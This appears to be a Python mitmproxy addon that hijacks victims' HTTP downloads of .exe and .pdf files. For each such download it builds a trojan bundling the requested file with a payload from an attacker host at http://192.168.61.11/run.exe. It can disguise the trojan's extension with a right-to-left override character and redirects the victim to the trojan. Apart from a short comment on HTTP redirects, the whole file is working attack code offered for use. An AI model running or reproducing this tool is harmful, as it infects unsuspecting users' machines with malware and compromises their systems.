#-*- mode: python -*-
# -*- coding: utf-8 -*-

import mitmproxy
import subprocess
import os
from Backdoor import *

#KNOWLEDGE START FROM HERE . UNDERSTAND HTTP ERRORS CODE STATUS
#The HTTP response status code 302 Found is a common way of performing URL redirection. The HTTP/1.0 specification (RFC 1945) initially defined this code, and gave it the description phrase "Moved Temporarily" rather than "Found".

#An HTTP response with this status code will additionally provide a URL in the header field Location. This is an invitation to the user agent (e.g. a web browser) to make a second, otherwise identical, request to the new URL specified in the location field. The end result is a redirection to the new URL. 

#Client request:

#GET /index.html HTTP/1.1
#Host: www.example.com

#Server response:

#HTTP/1.1 302 Found
#Location: http://www.iana.org/domains/example/


IP = ("192.168.61.11")
TARGET_TEXTENSIONS = [".exe", ".pdf"]
EVIL_FILE = "http://192.168.61.11/run.exe"
WEB_ROOT = "/var/www/html/"
SPOOF_EXTENSION = False # JUST set it to force if u want programm to stop spoofing files extensions

def request(flow):
	
	
	if flow.request.host != IP and flow.request.pretty_url.endswith(tuple(TARGET_TEXTENSIONS)):
		print("[+] Victim Downloading files with targeted Extensions")
		
		front_file_name = flow.request.pretty_url.split("/")[-1].split(".")[0]
		front_file = flow.request.pretty_url + "#"
		download_file_name = front_file_name + ".exe"
		trojan_file = WEB_ROOT + download_file_name
		

		print("[+] Generating a Backdoor for " + flow.request.pretty_url)

		trojan = Trojan(front_file, EVIL_FILE, None, trojan_file)
		trojan.create()
		trojan.compile()

		if SPOOF_EXTENSION == True: 
			print("[+] Renaming trojan to spoof its extension")
			front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]
			if front_file_extension != "exe":
				new_name = front_file_name + "‮" + "".join(reversed(front_file_extension))  + ".exe"
				spoofed_file = WEB_ROOT + new_name
				os.rename(trojan_file, spoofed_file)
						
				trojan.zip(spoofed_file)
				download_file_name = front_file_name + ".zip"
		
		
		torjan_download_url = "http://" + IP + "/" + download_file_name
		flow.response = mitmproxy.http.Response.make(301, "", {"Location": torjan_download_url})
